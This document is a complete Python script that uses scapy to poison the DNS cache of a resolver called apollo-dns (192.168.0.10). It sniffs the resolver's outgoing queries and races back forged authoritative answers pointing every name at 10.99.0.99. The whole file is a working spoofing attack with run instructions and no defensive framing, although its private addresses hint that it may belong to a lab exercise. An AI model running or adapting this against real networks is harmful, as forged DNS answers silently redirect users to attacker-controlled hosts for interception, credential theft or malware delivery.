#!/usr/bin/env python3
"""Forge DNS answers for queries forwarded by apollo-dns (192.168.0.10).

The script sniffs UDP/53 traffic leaving apollo-dns and answers every query
with an A record pointing at 10.99.0.99, so the fake answer lands in the
apollo-dns cache.

    sudo python3 dns-poison.py [iface]
"""

import sys

from scapy.all import DNS, DNSRR, IP, UDP, send, sniff

APOLLO = '192.168.0.10'
FAKE = '10.99.0.99'


def handle(pkt):
    if IP not in pkt or UDP not in pkt or DNS not in pkt:
        return
    if pkt[IP].src != APOLLO or pkt[UDP].dport != 53:
        return
    dns = pkt[DNS]
    if dns.qr != 0 or dns.qd is None:
        return
    name = dns.qd.qname.decode(errors='replace')
    answer = (IP(src=pkt[IP].dst, dst=APOLLO)
              / UDP(sport=53, dport=pkt[UDP].sport)
              / DNS(id=dns.id, qr=1, aa=1, rd=1, ra=1,
                    qd=dns.qd,
                    an=DNSRR(rrname=dns.qd.qname, type='A', ttl=300,
                             rdata=FAKE)))
    send(answer, verbose=False)
    print('forged answer: %s -> %s' % (name, FAKE), flush=True)


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else 'eth0'
    print('rogue DNS responder on %s, answering %s' % (iface, FAKE), flush=True)
    sniff(iface=iface, filter='udp port 53', prn=handle, store=0)


if __name__ == '__main__':
    main()
